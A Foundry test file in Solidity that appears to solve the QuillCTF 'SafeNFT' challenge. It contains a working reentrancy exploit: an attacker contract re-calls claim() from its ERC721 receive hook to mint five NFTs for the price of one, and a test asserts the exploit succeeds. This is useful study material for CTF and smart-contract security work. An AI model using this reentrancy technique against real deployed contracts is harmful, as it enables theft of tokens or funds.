// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "../../src/QuillCTF/SafeNFT/SafeNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SafeNFTReveiver is IERC721Receiver {
    uint expectMintTotalCount = 5;
    uint mintCount = 0;
    SafeNFT private safeNFT;

    address owner = msg.sender;

    constructor(address _nftAddress) {
        safeNFT = SafeNFT(_nftAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        safeNFT.buyNFT{value: msg.value}();
        safeNFT.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        safeNFT.transferFrom(address(this), owner, tokenId);

        mintCount++;
        if (mintCount < expectMintTotalCount) {
            safeNFT.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract SafeNFTTest is Test {
    SafeNFT public safeNFT;
    SafeNFTReveiver public safeNFTReveiver;
    address public deployer;

    function setUp() public {
        deployer = vm.addr(1);
        vm.deal(deployer, 0.01 ether);

        vm.startPrank(deployer);

        safeNFT = new SafeNFT("SafeNFT", "SNFT", 0.01 ether);
        safeNFTReveiver = new SafeNFTReveiver(address(safeNFT));

        vm.stopPrank();
    }

    function testSafeNFTExploit() public {
        vm.startPrank(deployer);
        safeNFTReveiver.attack{value: 0.01 ether}();

        uint256 safeNFTCount = safeNFT.balanceOf(deployer);

        emit log_uint(safeNFTCount);

        assertEq(safeNFTCount, 5);
    }
}
